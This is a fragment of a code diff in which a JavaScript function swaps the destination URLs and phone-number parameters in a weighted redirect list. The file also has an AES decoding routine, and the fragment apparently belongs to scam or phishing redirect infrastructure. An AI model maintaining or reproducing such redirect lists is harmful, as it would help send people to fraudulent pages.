@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://TrendPulse.on-forge.com/werrx01USAHTML/?bcda=+65 3106 3088", weight: 0.5 },
-        { url: "https://TrendPulse.on-forge.com/werrx01USAHTML/?bcda=+65 3106 3088", weight: 0.5 }
+        { url: "https://aurathreads.on-forge.com/werrx01USAHTML/?bcda=+65 3106 3088", weight: 0.5 },
+        { url: "https://aurathreads.on-forge.com/werrx01USAHTML/?bcda=+65 80085 23109", weight: 0.5 }
       
     ];
 
